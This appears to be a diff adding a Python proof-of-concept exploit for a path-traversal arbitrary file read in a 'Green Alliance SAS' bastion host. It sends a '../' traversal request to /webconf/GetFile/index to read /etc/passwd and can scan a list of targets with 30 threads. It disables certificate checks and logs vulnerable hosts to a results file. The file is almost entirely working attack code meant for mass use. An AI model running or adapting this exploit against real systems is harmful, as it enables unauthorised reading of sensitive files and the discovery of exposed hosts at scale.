@@ -1,0 +1,51 @@
+import requests,json,sys,argparse
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    text="""
+
+
+███████╗ █████╗ ███████╗      ██████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗       ███████╗██╗██╗     ███████╗███████╗
+██╔════╝██╔══██╗██╔════╝      ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝       ██╔════╝██║██║     ██╔════╝██╔════╝
+███████╗███████║███████╗█████╗██████╔╝█████╗  ███████║██║  ██║██║██╔██╗ ██║██║  ███╗█████╗█████╗  ██║██║     █████╗  ███████╗
+╚════██║██╔══██║╚════██║╚════╝██╔══██╗██╔══╝  ██╔══██║██║  ██║██║██║╚██╗██║██║   ██║╚════╝██╔══╝  ██║██║     ██╔══╝  ╚════██║
+███████║██║  ██║███████║      ██║  ██║███████╗██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝      ██║     ██║███████╗███████╗███████║
+╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝       ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝
+                                                                                                                             
+                                                           author:zm
+"""
+    print(text)
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='This is Vulnerabilities in Green Alliance SAS bastion machine for reading arbitrary files')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
+    arges=parser.parse_args()
+    if arges.url and not arges.file:
+        poc(arges.url)
+    elif arges.file and not arges.url:
+        url_line=[]
+        with open(arges.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_line.append(url.strip())
+        mp=Pool(30)
+        mp.map(poc, url_line)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python {sys.argv[0]} -h")
+def poc(target):
+    api='/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
+    try:
+        res1=requests.get(url=target+api,timeout=5,verify=False)
+        if 'nos:x:0:0::/:' in res1.text:
+            print(f"[+]{target} have loophole “{target+api}”")
+            with open ('result5.txt','a',encoding='utf-8') as f:
+                f.write(target+'\n')
+        else:
+            print(f"[-]{target} not have loophole")
+    except:
+        pass
+
+if __name__=='__main__':
+    main()
